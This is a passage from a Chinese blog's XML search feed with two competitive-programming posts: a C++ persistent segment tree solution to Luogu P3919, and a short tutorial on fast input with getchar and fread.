        <content type="html"><![CDATA[<p>原题地址:<a href="//www.luogu.org/problemnew/show/P3919">https://www.luogu.org/problemnew/show/P3919</a></p><h3 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h3><p>维护一个长度为N的数组，支持如下几种操作：  </p><ol><li>在某个历史版本上修改某一个位置上的值  </li><li>访问某个历史版本上的某一位置的值<br>此外，每进行一次操作（对于操作2，即为生成一个完全一样的版本，不作任何改动），就会生成一个新的版本。版本编号即为当前操作的编号（从1开始编号，版本0表示初始状态数组）</li></ol><hr><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>首先感谢来自<a href="https://www.luogu.org/space/show?uid=2978">@zcysky</a>的模板。写的非常漂亮，封装也很精致。<br>这题是裸题，于是直接上模板就行了。注意此题输入数据大，需要读入优化。<br>关于可持久化线段树的介绍与总结，之后把坑填上。  </p><hr><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1000005</span>;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a[N],n,q,rt[N*<span class="number">20</span>];<span class="comment">//空间复杂度O(mlogn) </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXB 50000000</span></span><br><span class="line"><span class="type">char</span> buf[MAXB],*cp=buf;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*cp&lt;<span class="string">&#x27;0&#x27;</span>||*cp&gt;<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(*cp==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(*cp&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;*cp&lt;=<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+*cp-<span class="string">&#x27;0&#x27;</span>; </span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Persistable_Segment_Tree</span> &#123;</span><br><span class="line">    <span class="type">int</span> lc[N*<span class="number">20</span>],rc[N*<span class="number">20</span>],val[N*<span class="number">20</span>],cnt;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> &amp;o,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        o=++cnt;</span><br><span class="line">        <span class="keyword">if</span>(l==r) &#123;</span><br><span class="line">            val[o]=a[l];</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(lc[o],l,mid);</span><br><span class="line">        <span class="built_in">build</span>(rc[o],mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">ins</span><span class="params">(<span class="type">int</span> &amp;o,<span class="type">int</span> pre,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> q,<span class="type">int</span> v)</span></span>&#123;</span><br><span class="line">        o=++cnt;</span><br><span class="line">        lc[o]=lc[pre];</span><br><span class="line">        rc[o]=rc[pre];</span><br><span class="line">        val[o]=val[pre];</span><br><span class="line">        <span class="keyword">if</span>(l==r) &#123;</span><br><span class="line">            val[o]=v;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(q&lt;=mid)</span><br><span class="line">            <span class="built_in">ins</span>(lc[o],lc[pre],l,mid,q,v);</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="built_in">ins</span>(rc[o],rc[pre],mid+<span class="number">1</span>,r,q,v);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> o,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> q)</span></span>&#123;<span class="comment">//类似二分的查询 </span></span><br><span class="line">        <span class="keyword">if</span>(l==r)</span><br><span class="line">            <span class="keyword">return</span> val[o];</span><br><span class="line">        <span class="type">int</span> mid=(l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(q&lt;=mid)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(lc[o],l,mid,q);</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">query</span>(rc[o],mid+<span class="number">1</span>,r,q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;T;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fread</span>(buf,<span class="number">1</span>,MAXB,stdin);</span><br><span class="line">    n=<span class="built_in">read</span>();</span><br><span class="line">    <span class="type">int</span> m=<span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        a[i]=<span class="built_in">read</span>();</span><br><span class="line">    T.<span class="built_in">build</span>(rt[<span class="number">0</span>],<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line">        <span class="type">int</span> pre=<span class="built_in">read</span>(),opt=<span class="built_in">read</span>(),x=<span class="built_in">read</span>();</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">1</span>) &#123;<span class="comment">//操作1:在版本pre的基础上将第x个数修改为v </span></span><br><span class="line">            <span class="type">int</span> v=<span class="built_in">read</span>();</span><br><span class="line">            T.<span class="built_in">ins</span>(rt[i],rt[pre],<span class="number">1</span>,n,x,v);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="number">2</span>) &#123;<span class="comment">//操作2:访问版本pre中第x个数的值 </span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,T.<span class="built_in">query</span>(rt[pre],<span class="number">1</span>,n,x));</span><br><span class="line">            rt[i]=rt[pre];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 持久化 </tag>
            
            <tag> 线段树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OI中的IO优化</title>
      <link href="/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/"/>
      <url>/2018/02/20/OI%E4%B8%AD%E7%9A%84IO%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>本文主要讲述常用的2种读入优化方法。<br>输出优化很少使用，在此简单提一下：也就是把输出的东西先放进字符串，再一次性puts\printf出去。提升不大，不常用。<br>首先当然需要先知道，scanf&#x2F;printf比cin&#x2F;cout快不少。<br>读入优化： </p><ol><li>getchar<br>使用getchar一个一个读入字符，转化成数字。比scanf快一些。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;<span class="comment">//f是正负的标识</span></span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        ch=<span class="built_in">getchar</span>();</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span>(ch&lt;<span class="string">&#x27;0&#x27;</span>||ch&gt;<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        ch=<span class="built_in">getchar</span>();</span><br><span class="line">    &#125; <span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>2.fread  （非常快！）<br>fread将stdin里的内容读到字符串里，然后利用指针处理。<br>首先定义指针和读入的数组：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXB 10000000</span></span><br><span class="line"><span class="comment">//定义读入最长的长度</span></span><br><span class="line">    <span class="type">char</span> buf[MAXB],*cp=buf;</span><br></pre></td></tr></table></figure>接下来是读入：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fread</span>(buf,<span class="number">1</span>,MAXB,stdin);<span class="comment">//函数具体参数含义请善用搜索引擎</span></span><br></pre></td></tr></table></figure>最后是从中处理出数据（现在这个函数是为了处理int整型而设计）  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> f=<span class="number">1</span>,x=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*cp&lt;<span class="string">&#x27;0&#x27;</span>||*cp&gt;<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(*cp==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            f=<span class="number">-1</span>;</span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(*cp&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;*cp&lt;=<span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        x=x*<span class="number">10</span>+*cp-<span class="string">&#x27;0&#x27;</span>; </span><br><span class="line">        cp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> f*x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> OI </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
